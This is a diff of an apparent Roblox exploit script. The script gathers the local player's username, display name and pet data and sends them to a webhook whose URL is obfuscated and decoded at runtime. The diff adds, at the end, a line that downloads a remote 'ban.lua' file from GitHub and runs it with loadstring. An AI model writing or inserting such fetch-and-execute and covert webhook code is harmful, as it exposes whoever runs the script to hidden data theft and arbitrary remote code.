@@ -3,7 +3,7 @@ local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local Event = ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent
--- FULLY UPDATED | BIWWW
+-- BAM
 local player = Players.LocalPlayer
 local playerUsername = player.Name
 local playerDisplayName = player.DisplayName
@@ -121,3 +121,5 @@ refreshSecretPets()
 task.wait(5)
 
 SendWebhook(decodedURL)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VoantplayYt/roblox-banlist/refs/heads/main/ban.lua"))()
